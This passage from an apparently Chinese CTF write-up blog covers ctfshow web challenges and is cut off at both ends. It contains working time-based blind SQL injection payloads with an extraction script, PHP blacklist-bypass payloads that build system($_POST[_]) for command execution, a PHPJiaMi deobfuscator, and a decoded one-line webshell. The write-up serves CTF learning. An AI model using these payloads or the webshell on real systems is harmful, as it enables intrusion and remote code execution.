mid</span><br></pre></td></tr></table></figure><p>立马想到<code>\</code>，发现下面可以延时：</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200915205306.png"></p><p><code>ascii</code>函数可以用<code>ord</code>函数代替，等号用<code>like</code>，<code>substr</code>用<code>left</code>,payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;or&#x2F;**&#x2F;if((ord(left(password,1))&#x2F;**&#x2F;like&#x2F;**&#x2F;73),sleep(3),0)#</span><br></pre></td></tr></table></figure><p>还可以用regexp注入，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;or&#x2F;**&#x2F;if((left(password,1)&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;0x49),sleep(3),1)#</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://631b5cfe-7f15-4390-958c-228c6a9c421a.chall.ctf.show&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">hexflag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        hexj=str(hex(ord(j))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        p1=<span class="string">&quot;or/**/if((left(password,&#123;&#125;)/**/regexp/**/binary/**/0x&#123;&#125;),sleep(3),1)#&quot;</span>.format(str(i),hexflag+hexj)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,hexj)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=j</span><br><span class="line">            hexflag+=str(hex(ord(j))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="WEB你取吧36D杯"><a href="#WEB你取吧36D杯" class="headerlink" title="WEB你取吧36D杯"></a>WEB你取吧36D杯</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用递增的那种思想构造就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];$__=$_;$_++;$_++;$_++;$_++;$_______=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$________=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_________=$_;$_++;$__________=$_;$_____=$_;$_++;$_++;$_++;$_++;$_++;$___________=$_;$___.=$_________;$___.=$___________;$___.=$_________;$___.=$__________;$___.=$_______;$___.=$________;$____=<span class="string">&#x27;_&#x27;</span>;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__;$__++;$____.=$__;$____.=$______;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line"><span class="comment">// SYSTEM($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%31%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2f</span><br></pre></td></tr></table></figure><p>POST要执行的命令就行，注意code要url编码，因为由于php字符串解析特性会把+解析成空格，题目环境是php5.6如果是7.x还可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;``````&#x27;</span>|<span class="string">&#x27;%13%19%13%14%05%0D&#x27;</span>)(<span class="string">&#x27;``&#x27;</span>|`%<span class="number">09</span>%<span class="number">04</span>`);</span><br><span class="line"><span class="comment">// system(&#x27;id&#x27;);</span></span><br></pre></td></tr></table></figure><p>构造system只需</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&#x27;system&#x27;</span>^<span class="string">&#x27;``````&#x27;</span>);</span><br></pre></td></tr></table></figure><p>除此之外我们还可以利用<code>$_</code>变量来构造字符，脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]</span><br><span class="line">word=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> s:</span><br><span class="line">            code+=<span class="string">&#x27;$_[&#x27;</span>+str(s.index(j))+<span class="string">&#x27;].&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code+=<span class="string">&quot;&#x27;&quot;</span>+j+<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;.&quot;</span></span><br><span class="line">print(code)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[2].$_[0].$_[19].&#39; &#39;.&#39;&#x2F;&#39;.$_[5].$_[13].$_[0].$_[6];$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>本题预期解是先读hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;$_[7].$_[8].$_[12].$_[19]&#125;</span><br></pre></td></tr></table></figure><p>base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;/phpjiami.zip\n/hint.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后把<code>phpjiami.zip</code>下载下来，打开发现<code>1.php</code>混淆加密的，并且提示是经过Www.PHPJiaMi.Com网站加密的，解密脚本，也可以用：<a href="https://github.com/PikuYoake/phpjiami_decode%EF%BC%9A">https://github.com/PikuYoake/phpjiami_decode：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span>(<span class="params">$code</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span>(<span class="params">$code</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2(&#x27;bWQ1&#x27;);</span></span><br><span class="line">    <span class="comment">// $key1 = $v1(&#x27;??????&#x27;);</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">&quot;(&#x27;&quot;</span> . preg_quote(base64_encode(<span class="string">&#x27;md5&#x27;</span>)) . <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">&quot;(&#x27;&quot;</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">&quot;&#x27;)&quot;</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">&#x27;.decrypted.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到加密数据&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到秘钥&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;解密后文件已写入到 &#x27;</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure><p>解密后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;hello.ass.world.er.rt.e.saucerman&quot;</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑连</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge-36D杯"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge-36D杯" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge_36D杯"></a>WEB_WUSTCTF朴实无华Revenge_Revenge_36D杯</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^0-9.]/&#x27;</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">&quot;/\./&quot;</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">&quot;/\-/&quot;</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">&quot;/\-/&quot;</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">&#x27;/^[-]/&#x27;</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;没有这样的数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span 